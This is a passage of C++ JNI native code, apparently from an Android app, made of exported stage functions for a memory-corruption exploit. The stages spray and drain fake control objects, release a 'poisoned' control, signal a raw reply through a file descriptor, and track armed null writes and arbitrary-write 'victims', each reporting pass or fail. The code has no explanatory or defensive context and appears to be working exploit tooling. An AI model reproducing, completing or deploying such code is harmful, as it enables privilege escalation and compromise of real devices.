            payload.data(), &prefilled, false);
    int expected = g_fake_control_expected;
    int blocked = prepared ? activate_fake_control_spray() : 0;
    bool pass = prepared && expected == kFakeControlSprayCount - 1 &&
            blocked == expected;
    char state[192];
    std::snprintf(state, sizeof(state),
            "status=%s stage=replacement-drain expected=%d blocked=%d"
            " prefilled=%d",
            pass ? "pass" : "fail", expected, blocked, prefilled);
    return environment->NewStringUTF(state);
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_releasePoisonedControl(
        JNIEnv* environment, jclass) {
    int released = release_poisoned_control();
    char signal = '1';
    bool signaled = false;
    {
        std::lock_guard<std::mutex> lock(g_raw_reply_signal_mutex);
        signaled = g_raw_reply_signal_fd >= 0 &&
                pwrite(g_raw_reply_signal_fd, &signal, 1, 0) == 1;
    }
    char state[160];
    std::snprintf(state, sizeof(state),
            "status=%s stage=poison-release released=%d signaled=%d",
            released == 1 && signaled ? "pass" : "fail", released,
            signaled ? 1 : 0);
    return environment->NewStringUTF(state);
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_releaseReplacementDrain(
        JNIEnv* environment, jclass) {
    int joined = release_fake_control_spray();
    char state[128];
    std::snprintf(state, sizeof(state),
            "status=%s stage=replacement-drain-release joined=%d",
            joined == kFakeControlSprayCount - 1 ? "pass" : "fail",
            joined);
    return environment->NewStringUTF(state);
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_releaseFakeNodeSpray(
        JNIEnv* environment, jclass) {
    if (g_raw_arbitrary_retained) {
        return environment->NewStringUTF(
                "status=held stage=fake-control-release"
                " reason=unresolved-retained-node");
    }
    bool write_miss = g_null_write_armed;
    int expected = g_fake_control_expected;
    int joined = release_fake_control_spray();
    bool pass = joined == expected;
    if (pass && write_miss) {
        ++g_internal_write_misses;
        g_null_write_armed = false;
        g_null_write_armed_victim = -1;
    }
    char state[256];
    std::snprintf(state, sizeof(state),
            "status=%s stage=fake-control-release joined=%d expected=%d"
            " write_miss=%d internal_write_misses=%d used_victims=%d",
            pass ? "pass" : "fail", joined, expected,
            write_miss ? 1 : 0, g_internal_write_misses,
            g_write_victims_used);
    return environment->NewStringUTF(state);
}
